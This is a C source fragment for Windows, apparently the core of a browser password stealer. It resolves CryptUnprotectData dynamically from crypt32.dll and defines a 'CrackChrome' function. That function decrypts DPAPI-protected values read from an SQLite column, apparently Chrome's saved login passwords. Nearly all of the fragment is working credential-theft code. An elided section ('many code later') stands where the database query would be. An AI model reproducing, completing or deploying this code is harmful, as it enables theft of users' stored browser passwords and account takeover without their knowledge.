/*CryptUnprotectData*/
typedef BOOL(__stdcall *CUData)(
	DATA_BLOB                *pDataIn,
	LPWSTR                    *ppszDataDescr,
	DATA_BLOB                *pOptionalEntropy,
	PVOID                     pvReserved,
	CRYPTPROTECT_PROMPTSTRUCT *pPromptStruct,
	DWORD                     dwFlags,
	DATA_BLOB                *pDataOut
);

CUData fCryptUnprotectData = NULL;

BOOL crypt32() {
	CRYPT = LoadLibraryA("crypt32.dll");
	if (CRYPT != NULL) {
		fCryptUnprotectData = (CUData)GetProcAddress(CRYPT, "CryptUnprotectData");
		if (fCryptUnprotectData != NULL) {
			return TRUE;
		}
		else return FALSE;
	}
	else return FALSE;
}

char* CrackChrome(BYTE *pass) 
{
	DATA_BLOB data_in, data_out;
	DWORD dwBlobSize;
	CHAR *decrypted;
	data_out.pbData = 0;
	data_out.cbData = 0;
	data_in.pbData = pass;
	for (dwBlobSize = 128; dwBlobSize <= 2048; dwBlobSize += 16)
	{
		data_in.cbData = dwBlobSize;
		if (fCryptUnprotectData(&data_in, NULL, NULL, NULL, NULL, 0, &data_out))
			break;
	}
	if (dwBlobSize >= 2048)
	{
		return NULL;
	}
	char* strClearData = (char*)talloc((data_out.cbData + 1)*sizeof(char));
	if (!strClearData)
	{
		LocalFree(data_out.pbData);
		return NULL;
	}
	decrypted = (char*)talloc((data_out.cbData + 1)*sizeof(char));
	memset(decrypted, 0, data_out.cbData);
	memcpy(decrypted, data_out.pbData, data_out.cbData);
	fsprintf(strClearData, data_out.cbData + 1, "%s", decrypted);
	LocalFree(data_out.pbData);
	tfree(decrypted);
	return strClearData;
}

int APIENTRY WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)
{
	  if (crypt32() == TRUE)
		{
        /* many code later ... */
        char *password = CrackChrome((BYTE *)sqlite3_column_text(stmt, 2));
    }
}
